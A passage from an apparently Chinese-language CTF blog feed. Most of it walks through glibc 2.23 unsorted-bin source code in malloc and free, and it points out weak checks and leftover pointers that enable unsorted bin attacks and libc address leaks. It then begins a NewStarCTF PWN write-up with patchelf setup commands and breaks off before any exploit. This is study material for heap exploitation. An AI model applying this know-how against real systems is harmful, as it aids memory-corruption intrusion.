(unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">           || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">           || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Unsorted-Bin的基本情况-对一些变量的理解"><a href="#Unsorted-Bin的基本情况-对一些变量的理解" class="headerlink" title="Unsorted Bin的基本情况 &amp; 对一些变量的理解"></a>Unsorted Bin的基本情况 &amp; 对一些变量的理解</h3><p>当用户申请一块堆内存的时候，malloc会先去fast bin里找适合的chunk，如果没有则去找small bin，如果还没有这才去找unsorted bin。也就是说如果考虑unsorted bin attack，那就要先考虑到前面两个bin的影响。unsorted bin是一个双向链表，取放的原则是FIFO。最先放入的chunk我们叫尾部，最后放入的叫头部，取出chunk的时候是从尾部取的。</p><p><code>unsorted_chunks(av)</code>: unsorted bin的堆头。unsorted bin一旦被使用，就会初始化这个堆头，它和main_arena在相同glibc版本下有着固定偏移（比如glibc2.23中是main_arena+0x58）。<br><code>av</code>: 一个指向当前arena地址的指针，也就是指向分配区的指针。<br><code>victim</code>: 指当前unsorted bin链表中处于尾部的chunk。<br><code>bck</code>: victim的上一个chunk。<br><code>nb</code>: 用户申请的chunk大小，包括了维护chunk的0x10结构部分。<br><code>remainder</code>: unsorted bin中的chunk被切割后剩下的部分。<br><code>last_remainder</code>: 最后一次被切割的chunk剩下的部分。</p><p>Unsorted Bin由一个循环的双向链表维护，也就是说，链表的头部chunk的bk会指向堆头，而尾部chunk的fd也会指向堆头，如下图所示（chunk0先被释放可看做尾部，chunk1后被释放可看做头部）：</p><p><img src="https://c-lby.github.io/images/glibc_unsortedbin/unsortedbin%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.png" alt="unsortedbin循环链表"></p><p>不难想象，如果unsorted bin中只含有一个chunk，那么这个chunk的fd和bk都会指向堆头，堆头的fd和bk都会指向这个chunk。</p><h3 id="malloc时unsorted-bin的行为"><a href="#malloc时unsorted-bin的行为" class="headerlink" title="malloc时unsorted bin的行为"></a>malloc时unsorted bin的行为</h3><p>接下来我们将源码分段来分析。以下分析顺序基于unsorted bin的行为顺序。</p><h5 id="一些基本检查"><a href="#一些基本检查" class="headerlink" title="一些基本检查"></a>一些基本检查</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*其他的下面再看*/</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这段代码检查了unsorted bin中是否含有chunk，设置了victim和bck两个变量，并且检查victim的size字段。这个检查相当地简单，所以给予了我们攻击的可能。当然，这种可能在2.29之后概率就很低了。</p><h5 id="对唯一chunk的分割"><a href="#对唯一chunk的分割" class="headerlink" title="对唯一chunk的分割"></a>对唯一chunk的分割</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">          If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">          only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">          runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">          exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">          no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp; <span class="comment">//用户申请的大小在smallbin范围中</span></span><br><span class="line">           bck == unsorted_chunks (av) &amp;&amp; <span class="comment">//unsorted bin中只有唯一chunk</span></span><br><span class="line">           victim == av-&gt;last_remainder &amp;&amp; <span class="comment">//这个chunk是上一次被分割的chunk（包括尚未被分割的chunk）</span></span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) <span class="comment">//这个chunk的size大于用户申请的大小+MINSIZE</span></span><br><span class="line">         &#123;</span><br><span class="line">           <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">           remainder_size = size - nb; <span class="comment">//剩余部分的大小</span></span><br><span class="line">           remainder = chunk_at_offset (victim, nb); <span class="comment">//剩余部分的chunk地址</span></span><br><span class="line">           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; <span class="comment">//修改堆头的fd和bk</span></span><br><span class="line">           av-&gt;last_remainder = remainder; <span class="comment">//更新最后被分割的chunk指针</span></span><br><span class="line">           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); <span class="comment">//修改剩余部分的fd和bk</span></span><br><span class="line">           <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">             &#123;</span><br><span class="line">               remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>)); <span class="comment">//设置取出来的部分的size字段 </span></span><br><span class="line">           set_head (remainder, remainder_size | PREV_INUSE); <span class="comment">//设置剩余部分的size字段</span></span><br><span class="line">           set_foot (remainder, remainder_size); <span class="comment">//设置物理意义上下一个chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">           check_malloced_chunk (av, victim, nb); <span class="comment">//对切割下来的chunk进行检查</span></span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim); <span class="comment">//返回mem指针给用户</span></span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p; </span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>只有满足if条件后malloc才会去切割unsorted bin中的chunk以返回合适的chunk给用户，否则会直接进入下一步。</p><h5 id="移除尾部chunk"><a href="#移除尾部chunk" class="headerlink" title="移除尾部chunk"></a>移除尾部chunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>代码很简单，但是确实把尾部的chunk扔出了unsorted bin。之所以会有这么一步是因为只要上一步切割没实现，那么接下来无论如何尾部chunk都不可能留在unsorted bin里了，要么被分配到其他bin中，要么大小刚刚好而被返回给用户。</p><h5 id="victim返回给用户"><a href="#victim返回给用户" class="headerlink" title="victim返回给用户"></a>victim返回给用户</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果用户申请的chunk大小和victim的大小刚刚好一样，那太好了，直接把victim返回给用户，皆大欢喜。当然，除了会改一改标志位除外，其他地方不会动。也就是说，原本存在上面的fd和bk指针现在依然残留在上面，那就可以利用这一点来泄露libc地址了。</p><h5 id="victim进入到small-bin或large-bin中"><a href="#victim进入到small-bin或large-bin中" class="headerlink" title="victim进入到small bin或large bin中"></a>victim进入到small bin或large bin中</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"> <span class="comment">/*核心的放置步骤在57行*/</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size)) <span class="comment">//如果victim在smallbin范围中（size&lt;0x400）</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size); <span class="comment">//找到对应size的bin的索引</span></span><br><span class="line">              bck = bin_at (av, victim_index); <span class="comment">//将bck设置为对应bin的地址</span></span><br><span class="line">              fwd = bck-&gt;fd; <span class="comment">//将fwd设置为对应bin当前的头部chunk</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="comment">//如果victim在largebin范围中</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size); <span class="comment">//同上</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="comment">/*下面一大坨看起来和复杂但其实它就在干一件事，那就是保持large bin内的chunk要按照size大小从小到大排序*/</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*放置chunk到对应bin的核心步骤，也就是设置fd和bk增加链表节点*/</span></span><br><span class="line">          mark_bin (av, victim_index); <span class="comment">//将victim要进入的bin的binmap设置为1，意味着这个bin里包含空闲chunk</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*然后返回到while处重新找下一个chunk是否能满足用户需求然后返回，除非unsorted bin已经空了，或者已经循环了MAX_ITERS次*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">//这个break是给最初那个while用的，这里也是while语句块的最后一个语句了。</span></span><br></pre></td></tr></table></figure><h5 id="依然找不到合适chunk的解决办法"><a href="#依然找不到合适chunk的解决办法" class="headerlink" title="依然找不到合适chunk的解决办法"></a>依然找不到合适chunk的解决办法</h5><p>如果unsorted bin已经空了或者循环次数过多了，但是还找不到合适的chunk给用户，ptmalloc就开largebin去找大小最合适的chunk，这个chunk大小可能比需要的还要大，所以会把它放进unsorted bin中进行切割。如果还没有，ptmalloc急了就会开地图炮去找合适的chunk来切割。实在没有的话，那就只能去切割top chunk了，或者合并fastbin亦或者直接sysmalloc，此处不做分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">      sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">     &#123;</span><br><span class="line">       bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">       <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">         &#123;</span><br><span class="line">           victim = victim-&gt;bk_nextsize;</span><br><span class="line">           <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                   (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">              list does not have to be rerouted.  */</span></span><br><span class="line">           <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">             victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">       <span class="comment">/*至此，最开始的for语句块结束了*/</span></span><br></pre></td></tr></table></figure><h3 id="free时unsorted-bin的行为"><a href="#free时unsorted-bin的行为" class="headerlink" title="free时unsorted bin的行为"></a>free时unsorted bin的行为</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av); <span class="comment">//将要被free的chunk插入链表头部</span></span><br><span class="line">     fwd = bck-&gt;fd; </span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) <span class="comment">//检查当前头部chunk的bk是否被破坏，对unsorted bin来说bk很重要</span></span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd; <span class="comment">//设置被free的chunk的fd和bk指针</span></span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p; <span class="comment">//插入链表</span></span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE); <span class="comment">//设置size字段</span></span><br><span class="line">     set_foot(p, size); <span class="comment">//设置物理相邻chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>chunk被释放后会进入unsorted bin有以下几种情况：<br>- 这个chunk不属于fastbin范围，则会先进入unsorted bin<br>- unsorted bin中的chunk被切割后，剩余部分如果大于MINSIZE，则会继续放回到unsorted bin中<br>- 触发malloc_consolidate之后，合并好的的chunk会先被放到unsorted bin中<br>- 这个chunk不与top chunk相邻，否则会被top chunk合并</p><p>关于这些情况的源码分析将在另一篇文章中进行。</p><p>参考阅读：<br>- <a href="https://www.jianshu.com/p/d3fdeff8683f">heap 中常见函数、宏与值</a></p>]]></content>
    
    
    <summary type="html">glibc_2.23，除非特别说明，否则下文默认为此版本下的分析。</summary>
    
    
    
    <category term="glibc源码补完计划" scheme="https://c-lby.top/categories/glibc%E6%BA%90%E7%A0%81%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/"/>
    
    
    <category term="heap" scheme="https://c-lby.top/tags/heap/"/>
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>『NewStarCTF2023』_week4 PWN WP</title>
    <link href="https://c-lby.top/2024/03/01/newstar-week4-wp/"/>
    <id>https://c-lby.top/2024/03/01/newstar-week4-wp/</id>
    <published>2024-03-01T09:35:50.000Z</published>
    <updated>2024-04-21T12:31:22.807Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言（patchelf的正确打开方式）"><a href="#0x00-前言（patchelf的正确打开方式）" class="headerlink" title="0x00 前言（patchelf的正确打开方式）"></a>0x00 前言（patchelf的正确打开方式）</h3><p>正好最近在学习堆入门，想起来去年还有newstar的题没复现完，所以干脆拿来当堆入门的练手了。但是在做完准备写wp用动调分析的时候遇到了一个问题。我的主力Linux是Ubuntu22，glibc版本是2.35，我学习堆也是从2.35开始往低版本对比学习，如果题目环境glibc不一样（一般都不一样，2.35版本太高了），则需要用patchelf来修改动态链接库以便gdb分析，但是按照网上的流程来patch怎么都不能成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6 --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ Double</span></span><br></pre></td></tr></table></figure><p>假如我想用以上命令patch Double这个程序，运行这个程序的时候就会变成这样：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/patchelf%E4%B8%8D%E6%88%90%E5%8A%9F.png" alt="patchelf不成功"></p><p>然后我问了xswlhhh师傅，只要将两个参数分开执行就行，也就是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2 Double</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 Double</span></span><br></pre></td></tr></table></figure><p>这样就能成功patch了。</p><p><code>--set-interpreter</code>后面的参数是对应libc的解释器ld文件。注意是ld文件不是libc.so.6！！！</p><p><code>--set-rpath</code>后面的参数是对应libc的目录。然后最后是你要patch的程序。</p><h3 id="0x01-Double"><a href="#0x01-Double" class="headerlink" title="0x01 Double"></a>0x01 Double</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>这是一道经典菜单堆题，题目名字已经明显提示了要用double 